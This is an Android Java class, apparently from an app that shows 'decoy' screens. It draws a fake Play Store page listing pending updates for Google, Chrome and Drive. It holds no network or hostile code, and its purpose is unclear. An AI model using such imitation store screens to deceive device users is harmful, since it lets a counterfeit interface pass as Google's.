package com.seguranca.protecao;

import android.widget.LinearLayout;

public class DecoyPlay extends DecoyScreen {
    protected String title() { return "Play Store"; }

    protected void buildContent(LinearLayout body) {
        body.setPadding(dp(12), dp(12), dp(12), dp(12));
        body.addView(block("Actualizaciones pendientes", "3 aplicaciones"));
        body.addView(block("Google", "Actualizar"));
        body.addView(block("Chrome", "Actualizar"));
        body.addView(block("Drive", "Actualizar"));
        body.addView(block("Biblioteca", "Apps y juegos"));
    }
}
